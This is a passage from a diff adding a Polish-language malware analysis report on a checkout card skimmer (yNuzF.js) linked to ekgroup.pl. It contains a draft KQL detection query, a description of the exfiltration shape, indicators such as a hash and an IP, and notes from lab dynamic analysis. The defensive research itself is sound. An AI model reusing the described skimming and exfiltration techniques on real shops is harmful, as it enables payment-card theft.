+      <li>Jesli na urzadzeniu doszlo do faktycznego wypelnienia formularza platnosci w oknie 2026-09-14 ok. 11:30 UTC - potraktowac karte jako potencjalnie skompromitowana i zalecic wydanie nowej.</li>
+      <li>Zbudowac regule na poziomie proxy/WAF pod ksztalt eksfiltracji (sekcja 09) zamiast pojedynczego hasha, ktory kit zmienia przy kazdym wdrozeniu pod nowa nazwa.</li>
+    </ol>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">09</span> Draft zapytania KQL</h2>
+    <div class="kql-block">
+      <div class="kql-head"><strong>KQL-1 &middot; Checkout skimmer w stylu ekgroup.pl/yNuzF.js</strong><span class="kql-meta">Defender XDR &middot; do dopracowania pod realny schemat danych</span></div>
+      <pre class="code"><span class="c">// Czesc 1: pobranie zasobu JS podszywajacego sie pod .css
+// o losowej nazwie z domeny spoza wlasnego CDN sklepu</span>
+DeviceNetworkEvents
+| where Timestamp > ago(14d)
+| where RemoteUrl has_any ("ekgroup.pl")
+    or RemoteUrl matches regex @"/[a-zA-Z0-9]{5}\.(js|css)$"
+| where InitiatingProcessFileName in~ ("firefox.exe", "chrome.exe", "msedge.exe")
+| project Timestamp, DeviceName, InitiatingProcessAccountName,
+    RemoteUrl, RemoteIP, InitiatingProcessFileName
+
+<span class="c">// Czesc 2: znany hash pliku (zmienia sie przy kazdym wdrozeniu kitu -
+// traktowac jako uzupelnienie, nie glowny warunek)</span>
+| union (
+    DeviceFileCertificateInfo
+    | where SHA256 == "1b23d13454bb4a2262da821bad3ada7a7f805fb33980abecefffafb4a10663e0"
+)
+
+<span class="warn">// TODO do dopracowania recznie (nie redukuje sie do prostego pole=wartosc):
+// wykrycie po ksztalcie body POST na checkoucie (FormData z kluczami
+// pasujacymi do wzorca "*_hash" wyslanym do sciezki "/" tej samej domeny,
+// z ktorej strona zaladowala JS) - wymaga logow WAF/reverse proxy
+// z telemetria ciala zadania, poza zasiegiem DeviceNetworkEvents.</span></pre>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">10</span> Dynamiczna analiza w labie</h2>
+
+    <p>Po zakonczeniu statyki analityk podjal probe zaobserwowania skryptu na zywo - wewnatrz izolowanego laba, na <code>windows_vm</code> z tymczasowo wlaczonym internetem (swiadomy, jednorazowy wyjatek, ten sam co dla Windows Sandboksa).</p>
+
+    <table>
+      <tr><th>Krok</th><th>Wynik</th></tr>
+      <tr>
+        <td class="strong">Dobor interfejsu do przechwytywania</td>
+        <td>Dwie pomylki po drodze: adapter Npcap, potem interfejs zarzadzania labem (host-only 10.0.0.x). Wlasciwy interfejs to Ethernet0.</td>
+      </tr>
+      <tr>
+        <td class="strong">Przechwytywanie ruchu (Wireshark)</td>
+        <td class="ok">Sukces</td>
+      </tr>
+      <tr>
+        <td class="strong">Deszyfrowanie TLS (SSLKEYLOGFILE)</td>
+        <td class="bad">Niepowodzenie</td>
+      </tr>
+      <tr>
+        <td class="strong">Dotarcie do formularza platnosci na zywej stronie</td>
+        <td class="warn">Zablokowane - checkout wymaga rejestracji konta</td>
+      </tr>
+      <tr>
+        <td class="strong">Obejscie muru: decoy checkout</td>
+        <td class="ok">Sukces czesciowy - overlay potwierdzony na zywo</td>
+      </tr>
+    </table>
+
+    <h3>Co potwierdzono mimo to</h3>
+    <p>Analiza pakietow (bez deszyfrowania) potwierdzila realne zapytania DNS/HTTP/TLS SNI do ekgroup.pl, w tym jawny <code>http://ekgroup.pl/</code> po zwyklym, nieszyfrowanym HTTP. Zero ruchu do <code>/js/yNuzF.js</code> ani do jakiegokolwiek sklepu z DOM-em checkoutu w tym konkretnym przebiegu - wizyta ograniczyla sie do strony glownej, nie checkoutu.</p>
+
+    <h3>Dlaczego deszyfrowanie TLS sie nie udalo</h3>
+    <p>Trzy niezalezne warstwy tego samego problemu, znalezione kolejno na zywo tego samego dnia:</p>
+    <ol>
+      <li><code>SSLKEYLOGFILE</code> ustawiane jako zmienna maszynowa nie jest rozgloszone do juz dzialajacych procesow - Explorer.exe rozdaje wlasny, zcache'owany blok srodowiska.</li>
+      <li>Naprawa przez broadcast <code>WM_SETTINGCHANGE</code> nie zadzialala, bo sesja SSH brokera dziala w Session 0 (bez interaktywnej stacji okien) - broadcast wyslany stamtad nie dociera do pulpitu, na ktorym zyje przegladarka.</li>
+      <li>Trzecia poprawka (broadcast przez <code>PsExec -i</code> wstrzykniety do aktywnej sesji, ten sam mechanizm co juz dzialajacy dla Procmona) zostala wdrozona i pozniej potwierdzona na zywo przy uruchamianiu decoy checkout - ale sam test deszyfrowania TLS na prawdziwej, zywej stronie HTTPS nie zostal powtorzony w tej sesji.</li>
+    </ol>
+
+    <h3>Decoy checkout - omijanie muru rejestracji</h3>
+    <p>Zamiast dalszych prob na zywej stronie, zbudowano w pelni lokalny harnass: strona HTML z kompletem hakow DOM z sekcji 04 (<code>opc_payment_methods</code>, <code>HOOK_PAYMENT</code> itd.), serwowana przez lokalny <code>HttpListener</code> na <code>windows_vm</code>, z prawdziwym <code>yNuzF.js</code> zaladowanym przeciw niej w realnej przegladarce (PsExec -i). Strona sama wypelnia testowe dane karty i probuje kliknac "PLACE ORDER" - zero recznej interakcji.</p>
+    <p>Wynik: overlay potwierdzony na zywo, pelny lancuch eksfiltracji - nie. Trzy iteracje w trakcie sesji (diagnostyka "heartbeat", poprawka nazwy pliku JS, lista realnych przyciskow na stronie) zawezily problem do konkretnego, nazwanego tropu (<code>asfdaw</code>/<code>misu21</code>), zamiast zostawic go jako czarna skrzynke.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">11</span> VirusTotal - Relations i Behavior</h2>
+
+    <p>Dobudowane narzedzie <code>hash_relationships</code> sprawdzilo zakladki "Relations" i "Behavior" VT dla hasha <code>yNuzF.js</code>, w poszukiwaniu realnego adresu C2.</p>
+
+    <div class="notice amber">
+      <span class="label">Wynik nalezy czytac z duza rezerwa</span>
+      <p>Drzewo procesow z <code>behaviour_summary</code> pokazuje uruchomienie przez <code>wscript.exe</code> (Windows Script Host) - sandbox VT wykonal plik jako samodzielny skrypt, NIE jako <code>&lt;script&gt;</code> wewnatrz przegladarki. Bez DOM-u/window/XMLHttpRequest przegladarki realna logika skimmera nigdy sie nie uruchomila - potwierdza to pusta lista <code>http_conversations</code> (zero rzeczywistej aktywnosci sieciowej) mimo obecnosci kilku adresow IP/domen w wyniku.</p>
+    </div>
+
+    <table>
+      <tr><th>Pole</th><th>Wartosc</th><th>Ocena</th></tr>
+      <tr><td class="strong">contacted_ips</td><td class="mono">162.159.36.2, 23.210.244.18, 23.210.244.26</td><td>Cloudflare/Akamai - szum sandboxa, niepowiazane z ekgroup.pl</td></tr>
+      <tr><td class="strong">contacted_domains</td><td class="mono">a1672.dscr.akamai.net</td><td>generyczne uslugi tla</td></tr>
+    </table>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">12</span> Ograniczenia analizy / otwarte watki</h2>
+    <ul>
+      <li><span class="ok">[Rozwiazane]</span> Weryfikacja bajt-po-bajcie miedzy zawartoscia HTTP w cache2 a plikiem yNuzF.js - luka zamknieta po dobudowaniu <code>parse_browser_cache</code> (sekcja 02).</li>
+      <li>Deobfuskacja reczna, poza toolingiem laba (REMnux nie ma Node.js) - tablica stringow rozkodowana lokalnym skryptem Python, nie w silniku JS. Zweryfikowano na wielu indeksach kontrolnie, ale pelnej symbolicznej ewaluacji calego skryptu nie wykonano.</li>
+      <li><span class="ok">[Czesciowo domkniete]</span> Analiza dynamiczna byla pierwotnie poza zakresem modulu static/. Dwa podejscia w module windows/: capture pakietow (potwierdzil ruch DNS/HTTP/TLS, ale bez deszyfrowania) oraz decoy checkout (potwierdzil wstrzykniecie overlaya, ale NIE pelny lancuch klik&rarr;eksfiltracja - prawdopodobna dodatkowa bramka aktywacji przez ciasteczko, nazwana ale niezmapowana - <code>asfdaw</code>/<code>misu21</code>). Serwerowa strona endpointu POST <code>/</code> pozostaje niepotwierdzona eksperymentalnie w obu podejsciach.</li>
+      <li>YARA bez trafien w domyslnym rulesecie <code>manalyze</code> - ruleset jest pisany pod pliki PE, nie pod JS przegladarkowy. Brak trafien nie jest tu sygnalem informacyjnym; wlasna regula celowana w kit zostala dobudowana (sekcja 06).</li>
+      <li><span class="ok">[Zrewidowane]</span> Serwerowy komponent eksfiltracji - wczesniej niejasne, czy ekgroup.pl przetwarza skradzione dane, czy jest jedynie hostingiem dla innej strony. urlscan.io pokazal, ze ekgroup.pl to samodzielny sklep PrestaShop, wiec najbardziej prawdopodobne jest, ze to WLASNY, skompromitowany serwer sklepu odbiera dane. Nadal niepotwierdzone bezposrednio (brak dostepu do serwera) - to wniosek z posrednich dowodow, nie z inspekcji backendu.</li>
+      <li>Dane VirusTotal "Relations"/"Behavior" nie sa reprezentatywne dla tej probki (sekcja 11) - sandbox VT uruchomil yNuzF.js przez wscript.exe, nie jako <code>&lt;script&gt;</code> w przegladarce, wiec nigdy nie uruchomil realnej logiki skimmera.</li>
+      <li>Pivot po innych domenach hostowanych na tym samym IP (185.201.115.23) - nie wykonany w tej sesji.</li>
+    </ul>
+  </section>
+
+  <div class="footer">
+    THREAT-027 &middot; 2026-09-14 &middot; telemetria: cache2 Firefoksa + surowy JS ze zrodla + statyczna deobfuskacja + capture pakietow i decoy checkout (windows_vm) + urlscan.io &middot; werdykt oparty wylacznie na potwierdzonych artefaktach, niepewnosci oznaczone jawnie
+  </div>
+
+</div>
+
+<script>
+  function setTheme(t){
+    document.documentElement.setAttribute('data-theme', t);
+    document.getElementById('btn-dark').classList.toggle('active', t === 'dark');
+    document.getElementById('btn-light').classList.toggle('active', t === 'light');
+  }
+</script>
+</body>
+</html>
